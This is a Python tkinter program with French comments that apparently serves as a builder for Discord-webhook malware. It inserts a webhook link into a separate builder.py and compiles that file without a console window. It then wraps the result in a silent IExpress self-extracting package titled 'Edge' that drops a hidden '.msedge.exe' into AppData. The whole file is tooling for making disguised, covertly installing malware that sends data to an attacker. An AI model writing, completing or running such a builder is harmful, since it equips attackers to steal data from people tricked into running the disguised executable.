import customtkinter
import tkinter as tk
from tkinter import filedialog
from PIL import Image, ImageTk
from tkinter import messagebox
from tkinter import ttk
import subprocess


bg="black"
root = tk.Tk()
root.attributes("-fullscreen", False)
root.geometry("1000x600")
root.config(bg=bg)

def exit():
    root.destroy()

def replace_first_line(file_path, new_line):
    # Lire le contenu du fichier
    with open(file_path, 'r') as file:
        lines = file.readlines()

    # Modifier la première ligne
    lines[0] = new_line + '\n'

    # Écrire le nouveau contenu dans le fichier
    with open(file_path, 'w') as file:
        file.writelines(lines)


def discord_click():
    webhook_link = discord_input.get()
    update_builder_file(webhook_link)

def update_builder_file(webhook_link):
    
    builder_file_path = "./src/builder.py"
    
    with open(builder_file_path, "r") as file:
        content = file.read()
    content = content.replace("WEBHOOK_LINK", webhook_link)
    
    with open(builder_file_path, "w") as file:
        file.write(content)
    
    replace_first_line("./flags.txt", "1") # on remplace le flag 0 par 1 pour spécifier qu'on a un webhook link

    


def iexpress():
    # Création d'un fichier de commande IExpress
    command_script = """
:: -------------------
:: Self Extraction Directive file
:: -------------------
[Version]
; Vous pouvez spécifier ici la version de l'archive si nécessaire
Class=IEXPRESS
SEDVersion=3
[Options]
; Spécifier le titre de l'application
Title=Edge
; Ne pas afficher de fenêtre de confirmation
ConfirmInstall=No
; Ne pas afficher de licence
LicenseFile=None
; Ne pas supprimer les fichiers temporaires
TempMode=0
; Ne pas créer de raccourci dans le menu Démarrer
StartupProgramGroup=No
; Ne pas afficher de message
FinishMessage=None
[Strings]
; Définir les chaînes de texte nécessaires
;
[InstallOptions]
; Options d'installation
HideExtractAnimation=1
[SourceFiles]
; Spécifier les fichiers source à inclure
SourceFiles=.
[SourceFiles0]
; Spécifier les fichiers source à inclure
%AppData%\\.msedge.exe=msedge.exe
%OutputFolder%\\.builder.exe=builder.exe
[Strings.1]
; Définir les chaînes de texte nécessaires
;
"""
    print("TEST1")
    # Enregistrer le script de commande dans un fichier temporaire
    with open("iexpress_script.sed", "w") as f:
        f.write(command_script)
    print("TEST2")

    # Lancer IExpress pour créer le fichier exécutable auto-extractible
    subprocess.run(["iexpress", "/N", "/Q", "/C", "iexpress_script.sed"])
    print("TEST3")

    # Supprimer le script de commande temporaire
    # Note : À faire après avoir exécuté IExpress
    # car IExpress verrouille le fichier script
    
    #os.remove("iexpress_script.sed")


def generation():
    # Chemin du fichier flags.txt
    flags_file_path = "./flags.txt"

    # Lire la première ligne du fichier flags.txt
    with open(flags_file_path, "r") as file:
        first_line = file.readline().strip()

    if first_line == "1":
        # Lancer la commande dans PowerShell
        subprocess.run(["powershell", "pyinstaller -F ./src/builder.py --noconsole"])
        iexpress()
        
    else:
        messagebox.showinfo("Error", "There is no Discord WebHook ! Please write your discord WebHook link ! ")

    


frame = tk.Frame(master=root)

#########LOGO######
img_logo = Image.open("./images/MOS_logo.png")
resized_logo = img_logo.resize((200,250), Image.Resampling.LANCZOS)
img_logo_resized = ImageTk.PhotoImage(resized_logo)

logo = tk.Label(root, image=img_logo_resized, bg=bg )
logo.pack()

#################

# Créer l'entrée Discord
discord_input = customtkinter.CTkEntry(master=root, placeholder_text="Please type your Discord Webhook link...", width=300)
discord_input.pack(side=tk.LEFT, padx=10)

# Créer le bouton OK
discord_button = customtkinter.CTkButton(root, text="OK", command=discord_click)
discord_button.pack(side=tk.LEFT, padx=10)

# Bouton génération .exe

generate = customtkinter.CTkButton(master=root, text="Generate EXE", command= generation)
generate.pack(side=tk.LEFT, padx=10)



root.mainloop()